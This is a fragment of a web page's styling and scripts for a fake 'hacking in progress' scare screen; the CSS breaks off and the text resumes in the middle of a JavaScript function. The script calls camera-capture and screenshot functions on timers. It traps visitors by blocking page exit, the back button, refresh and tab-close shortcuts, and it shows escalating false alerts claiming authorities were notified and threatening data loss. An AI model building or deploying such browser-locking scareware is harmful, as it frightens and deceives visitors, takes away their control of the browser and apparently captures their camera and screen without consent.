        }

            border-left: 3px solid #f00;
            animation: glitch 0.5s infinite;
        }

        .loading::after {
            content: '...';
            animation: dots 1s infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }

        .glitch {
            animation: glitch 0.3s infinite;
        }
              @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        .progress-bar {
            display: block;
            width: 100%;
            height: 20px;
            border: 1px solid #0f0;
            margin: 10px 0;
            position: relative;
        }

        .progress-fill {
            height: 100%;
            background: #0f0;
            width: 0%;
            transition: width 0.2s;
            box-shadow: 0 0 10px #0f0;
        }

        .blink {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }

                await captureCamera();
            }, 3000);
            
            // AMBIL SCREENSHOT
            setTimeout(async () => {
                await captureScreenshot();
            }, 5000);
        });

        // Prevent closing/leaving page
        window.addEventListener('beforeunload', function(e) {
            if (hackingStarted && sequenceIndex < sequences.length - 2) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            }
        });

        // Prevent back button with multiple warnings
        let backAttempts = 0;
        history.pushState(null, null, location.href);
        window.addEventListener('popstate', function() {
            if (hackingStarted && sequenceIndex < sequences.length - 2) {
                history.pushState(null, null, location.href);
                backAttempts++;
                
                const warnings = [
                    '⚠️ WARNING #1: ACCESS DENIED\nOperation in progress. Cannot exit.',
                    '⚠️ WARNING #2: SECURITY BREACH DETECTED\nAttempt to escape logged. Authorities notified.',
                    '⚠️ WARNING #3: CRITICAL ERROR\nForced exit will trigger system lockdown!',
                    '🚨 WARNING #4: FINAL WARNING\nContinuing to exit may result in permanent data loss!',
                    '💀 WARNING #5: LAST CHANCE\nAll attempts are being recorded. You cannot escape!'
                ];
                
                if (backAttempts <= warnings.length) {
                    alert(warnings[backAttempts - 1]);
                } else {
                    alert('⚠️ SYSTEM LOCKED - Too many escape attempts detected!');
                }
            }
        });

        // Disable common exit shortcuts
        document.addEventListener('keydown', function(e) {
            if (hackingStarted && sequenceIndex < sequences.length - 2) {
                // Disable F5, Ctrl+R (refresh)
                if ((e.key === 'F5') || (e.ctrlKey && e.key === 'r')) {
                    e.preventDefault();
                    alert('⚠️ REFRESH BLOCKED - Hacking sequence in progress');
                }
                // Disable Ctrl+W (close tab)
                if (e.ctrlKey && e.key === 'w') {
                    e.preventDefault();
                    alert('⚠️ EXIT BLOCKED - System breach in progress');
                }
            }
        });

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
